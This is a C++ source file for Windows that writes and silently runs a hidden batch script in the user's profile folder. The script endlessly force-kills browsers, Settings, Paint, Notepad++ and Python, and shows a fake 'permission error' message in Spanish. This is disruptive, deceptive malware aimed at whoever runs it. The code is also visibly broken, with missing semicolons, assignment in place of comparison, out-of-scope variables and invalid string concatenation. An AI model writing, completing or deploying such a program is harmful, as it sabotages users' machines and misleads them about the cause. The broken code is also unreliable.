#include <windows.h>
#include <direct.h>
#include <iostream>
#include <string>
#include <fstream>

using namespace std;

int main() {
    
    const char* usr = getenv("USERPROFILE");
    
    while (1) {
        
        if (usr) {
            if (_chdir(usr) == -1) {
                cout << "ERROR0\n";
                continue;
            }
            const char* usrx0 = "afolder";
            system("if exist \"afolder\" rd /q /f \"afolder\"");
            if (_mkdir("afolder") = 0) {
                cout << "ERROR1\n";
                continue;
            }
            string usrx1 = usr + "\\" + usrx0
            if (_chdir(usrx1.c_str()) == -1) {
                cout << "ERROR2\n";
                continue;
            }
            const char* bfld = "bfolder";
            if (_mkdir("bfolder") == 0) {
                cout << "ERROR3\n";
                continue;
            }
        } else {
            cout << "ERROR4\n";
            const char* usr = "C:\\Users\\Public";
            system("setx USERPROFILE=C:\\Users\\Public");
            continue;
        }
        cout << "TRUE0\n";
        break;
    }
    
    ofstream xx0("0-script.cmd", usrx1.c_str());
    
    if (xx0.is_open()) {
        xx0 << "@echo off\n";
        xx0 << "attrib +h \"0-script.cmd\"\n";
        xx0 << ":repet\n";
        xx0 << "taskkill /f /im \"msedge.exe\"\n";
        xx0 << "taskkill /f /im \"SystemSettings.exe\"\n";
        xx0 << "taskkill /f /im \"mspaint.exe\"\n";
        xx0 << "taskkill /f /im \"notepad++.exe\"\n";
        xx0 << "taskkill /f /im \"opera.exe\"\n";
        xx0 << "taskkill /f /im \"firefox.exe\"\n";
        xx0 << "taskkill /f /im \"python.exe\"\n";
        xx0 << "timeout /t 10 /nobreak\n";
        xx0 << "msg * \"error, el sistema inhabilita los procesos con problemas de permisos!\"\n";
        xx0 << "timeout /t 2 /nobreak\n";
        xx0 << "if exist \"bfolder\" cd \"bfolder\"\n";
        xx0 << "start /b 1-script.vbs\n";
        xx0 << "goto repet\n";
        
        xx0.close();
    } else {
        cout << "ERROR5\n";
        Sleep(10000);
        return 0;
    }
    
    while (1) {
        
        if (bfld) {
            if (_chdir(bfld) == -1) {
                cout << "ERROR6\n";
                continue;
            }
        } else {
            cout << "ERROR7\n";
            continue;
        }
        cout << "TRUE1\n";
        break;
    }
    
    string usrx2 = string(usrx1) + "\\" + bfld
    ofstream xx1("1-script.vbs", usrx2.c_str());
    
    if (xx1.is_open()) {
        xx1 << "\n";
        
        xx1.close();
    } else {
        cout << "ERROR8\n";
        Sleep(10000);
        return 0;
    }

    while (1) {

        if (usrx1.c_str()) {
            if (_chdir(usrx1.c_str()) == -1) {
                cout << "ERROR9\n";
                continue;
            }
        } else {
            cout << "ERROR10\n";
            Sleep(10000);
            return 0;
        }
        cout << "TRUE2\n";
        break;
    }
    
    const char* usrx3 = "0-script.cmd";
    ShellExecute(NULL, "open", usrx3, NULL, NULL, SW_HIDE);
    
    return 0;
}
